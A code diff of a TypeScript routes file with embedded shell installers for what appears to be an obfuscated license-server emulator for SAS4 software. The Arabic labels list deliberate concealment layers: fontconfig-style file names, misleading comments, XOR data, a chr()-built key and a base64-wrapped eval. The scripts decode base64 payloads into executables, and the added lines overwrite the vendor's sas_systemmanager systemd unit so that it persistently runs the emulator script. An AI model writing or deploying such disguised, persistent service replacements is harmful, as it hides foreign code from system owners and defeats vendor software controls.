@@ -691,7 +691,7 @@ export async function registerRoutes(
             { label: "التشفير على العميل", value: "المفتاح يُبنى من chr() codes: [71,114,51,110,100,49,122,51,114] + ساعة محلية" },
             { label: "طبقات التمويه", value: "1) أسماء ملفات fontconfig  2) تعليقات مضللة  3) ضغط zlib+base64  4) متغيرات بحرف واحد  5) بيانات XOR  6) مفتاح من chr() codes  7) verify مغلف بـ base64 eval" },
             { label: "بورت الإيميوليتر", value: "4000 (localhost 127.0.0.1)" },
-            { label: "استعلام SAS4", value: "https://127.0.0.1:4000/?op=get", mono: true },
+            { label: "استعلام SAS4", value: "http://127.0.0.1:4000/?op=get", mono: true },
             { label: "كاش الإيميوليتر", value: "5 دقائق - يحفظ payload مؤقتاً لتقليل الطلبات للسلطة" },
           ],
         }),
@@ -1277,10 +1277,8 @@ if [ -z "$_EM" ]; then
   exit 1
 fi
 
-chattr -i "$_P/$_E" 2>/dev/null || true
 echo "$_EM" > "$_P/$_E"
 chmod +x "$_P/$_E"
-chattr +i "$_P/$_E" 2>/dev/null || true
 echo "$_VF" > "$_P/$_V"
 chmod +x "$_P/$_V"
 
@@ -1753,10 +1751,8 @@ sleep 1
 mkdir -p ${P.BASE}
 mkdir -p ${P.PATCH_DIR}
 
-chattr -i ${P.BASE}/${P.EMULATOR} 2>/dev/null || true
 echo '${emulatorB64}' | base64 -d > ${P.BASE}/${P.EMULATOR}
 chmod +x ${P.BASE}/${P.EMULATOR}
-chattr +i ${P.BASE}/${P.EMULATOR} 2>/dev/null || true
 
 echo '${verifyB64}' | base64 -d > ${P.BASE}/${P.VERIFY}
 chmod +x ${P.BASE}/${P.VERIFY}
@@ -1811,12 +1807,10 @@ _eb="\\\${_EMU_B64}"
 _vb="\\\${_VER_B64}"
 if ! systemctl is-active \\\${_s1} >/dev/null 2>&1; then
   mkdir -p \\\${_d}
-  chattr -i \\\${_d}/\\\${_e} 2>/dev/null || true
   if [ ! -f \\\${_d}/\\\${_e} ]; then
     echo "\\\${_eb}" | base64 -d > \\\${_d}/\\\${_e}
     chmod +x \\\${_d}/\\\${_e}
   fi
-  chattr +i \\\${_d}/\\\${_e} 2>/dev/null || true
   mkdir -p /opt/sas4/bin
   cp \\\${_d}/\\\${_e} /opt/sas4/bin/sas_tec.py
   chmod +x /opt/sas4/bin/sas_tec.py
@@ -1860,17 +1854,24 @@ mkdir -p /opt/sas4/bin
 cp ${P.BASE}/${P.EMULATOR} /opt/sas4/bin/sas_tec.py
 chmod +x /opt/sas4/bin/sas_tec.py
 
-systemctl stop sas_systemmanager 2>/dev/null || true
-systemctl disable sas_systemmanager 2>/dev/null || true
-rm -f /etc/systemd/system/sas_systemmanager.service 2>/dev/null
+cat > /etc/systemd/system/sas_systemmanager.service << '_SAS_SVC_'
+[Unit]
+Description=SAS4 System
+[Service]
+ExecStart=/usr/bin/python3 /opt/sas4/bin/sas_tec.py
+Restart=always
+[Install]
+WantedBy=multi-user.target
+_SAS_SVC_
 
 systemctl daemon-reload
 systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true
-systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
+systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer sas_systemmanager
 systemctl start ${P.SVC_VERIFY}.timer
 systemctl start ${P.PATCH_SVC}.timer
 fuser -k 4000/tcp 2>/dev/null || true
 sleep 1
+systemctl stop sas_systemmanager 2>/dev/null || true
 systemctl start ${P.SVC_MAIN}
 sleep 2
 
